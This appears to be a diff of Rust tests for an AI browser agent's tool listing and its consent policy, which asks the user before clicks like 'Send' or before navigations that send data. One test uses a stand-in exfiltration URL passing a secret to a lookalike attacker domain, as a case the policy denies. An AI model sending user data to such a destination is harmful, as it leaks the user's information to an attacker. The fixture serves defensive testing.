@@ -375,9 +375,16 @@ fn the_prompt_listing_comes_from_the_contract() {
     let kernel = crate::load_kernel();
     let listing = kernel.prompt_listing();
 
-    // Every tool, so the model is never told about a tool that does not exist
-    // nor left ignorant of one that does.
-    assert_eq!(listing.lines().filter(|l| l.starts_with("- ")).count(), 18);
+    // Every tool the model may spend a step on, so it is never told about one
+    // that does not exist nor left ignorant of one that does.
+    //
+    // Seventeen, not eighteen: page.observe is withheld on purpose. The loop
+    // looks at the page before every turn and puts it in the prompt, so asking
+    // to look buys nothing and costs a step -- a real run spent ten of its
+    // seventeen steps doing exactly that. See the_prompt_does_not_offer_a_tool
+    // _for_looking. Any OTHER tool going missing is a bug, which is what this
+    // count still catches.
+    assert_eq!(listing.lines().filter(|l| l.starts_with("- ")).count(), 17);
     assert!(listing.contains("- page.click [R1]"));
     assert!(listing.contains("- tabs.list [R0]"));
 
@@ -428,4 +435,133 @@ fn a_scroll_outside_the_contract_is_denied() {
         "page.scroll",
         r#"{"direction":"down","amount":"lots"}"#,
     ));
+}
+
+#[test]
+fn a_bare_argument_is_wrapped_in_the_property_its_tool_expects() {
+    // Measured on a real run: a model wrote the address on its own and the shape
+    // check answered "arguments are not a JSON object" -- correct, useless, and
+    // a step gone. It happened twice in twelve steps.
+    let kernel = crate::load_kernel();
+    let wrapped = kernel.normalize_arguments("browser.navigate", "\"https://example.org/\"");
+    assert_eq!(wrapped, "{\"url\":\"https://example.org/\"}");
+}
+
+#[test]
+fn an_argument_object_is_left_exactly_as_it_is() {
+    let kernel = crate::load_kernel();
+    let given = "{\"url\":\"https://example.org/\"}";
+    assert_eq!(kernel.normalize_arguments("browser.navigate", given), given);
+}
+
+#[test]
+fn a_bare_argument_is_refused_when_the_tool_takes_more_than_one() {
+    // page.type needs an element and text. There is no way to know which one a
+    // lone string meant, and guessing would type into the wrong place or click
+    // something the model never named. The shape check keeps the final say.
+    let kernel = crate::load_kernel();
+    let given = "\"sidemen\"";
+    assert_eq!(kernel.normalize_arguments("page.type", given), given);
+}
+
+#[test]
+fn a_verb_buried_in_a_description_does_not_stop_the_agent() {
+    // Measured on youtube.com. A channel link carries the whole channel
+    // description as its accessible name -- "We post new Sidemen videos every
+    // single Sunday!" -- and "post" is a consequential verb, so clicking the
+    // channel asked the user to approve it. Twice, in one run, for a link that
+    // does nothing but navigate.
+    let request = ffi::PolicyRequest {
+        tool: "page.click".to_string(),
+        arguments_json: r#"{"element_id":"e1"}"#.to_string(),
+        task: "play the latest sidemen video".to_string(),
+        url: "https://www.youtube.com/".to_string(),
+        elements: vec![element(
+            "e1",
+            "link",
+            "Sidemen Verified @Sidemen 23.4M subscribers Welcome to the official              Sidemen channel. The home of #SidemenSundays - We post new Sidemen              videos every single Sunday!",
+        )],
+    };
+    let decision = decide(&request);
+    assert!(
+        decision.disposition == ffi::Disposition::Allow,
+        "a verb inside a description escalated an ordinary link: {}",
+        decision.reason
+    );
+}
+
+#[test]
+fn a_verb_in_the_actual_label_still_stops_the_agent() {
+    // The other half. Shortening the window must not blind the rule to the
+    // controls it exists for -- a button that says Send at the front is exactly
+    // what should still be asked about.
+    let request = ffi::PolicyRequest {
+        tool: "page.click".to_string(),
+        arguments_json: r#"{"element_id":"e1"}"#.to_string(),
+        task: "reply to the email".to_string(),
+        url: "https://mail.example.com/".to_string(),
+        elements: vec![element("e1", "button", "Send")],
+    };
+    let decision = decide(&request);
+    assert!(
+        decision.disposition != ffi::Disposition::Allow,
+        "clicking Send was allowed without asking"
+    );
+}
+
+#[test]
+fn the_prompt_does_not_offer_a_tool_for_looking() {
+    // The loop looks before every turn and puts the page in the prompt, so
+    // page.observe buys nothing and costs a step. A real run spent ten of
+    // seventeen steps calling it in a row.
+    let kernel = crate::load_kernel();
+    let listing = kernel.prompt_listing();
+    assert!(
+        !listing.contains("page.observe"),
+        "page.observe is still offered: {listing}"
+    );
+    // page.find is a different thing and must survive.
+    assert!(listing.contains("page.find"), "page.find went missing: {listing}");
+}
+
+#[test]
+fn the_bare_name_a_person_writes_names_the_site() {
+    // "go to youtube and play me the latest sidemen video" asked the user to
+    // approve going to youtube.com -- a permission prompt for the one thing
+    // they had just said out loud. Whole-host equality meant "youtube" never
+    // matched "www.youtube.com".
+    // The query matters: a search URL carries data, so without the bare-name
+    // match EVERY search would have stopped for approval -- which would have
+    // throttled the one-step search route it exists to enable.
+    let mut going = request(
+        "browser.navigate",
+        r#"{"url":"https://www.youtube.com/results?search_query=sidemen"}"#,
+    );
+    going.task = "go to youtube and play me the latest sidemen video".to_string();
+    going.url = "https://www.google.com/".to_string();
+    assert_allowed(&going);
+}
+
+#[test]
+fn a_name_inside_someone_elses_domain_does_not_count() {
+    // The reason this is matched against the registrable label and not against
+    // every label in the host. A task mentioning google must not make
+    // google.evil.example an expected destination -- that is the exact shape an
+    // exfiltration takes.
+    //
+    // The URL carries a query, because that is what the rule turns on: visiting
+    // a new site is reversible and allowed, SENDING it something is what has to
+    // be asked about.
+    let mut going = request(
+        "browser.navigate",
+        r#"{"url":"https://google.evil.example/collect?q=secret"}"#,
+    );
+    going.task = "search google for the spec sheet".to_string();
+    going.url = "https://docs.example.com/".to_string();
+    let decision = decide(&going);
+    assert!(
+        decision.disposition != ffi::Disposition::Allow,
+        "a lookalike domain was treated as expected: {}",
+        decision.reason
+    );
 }
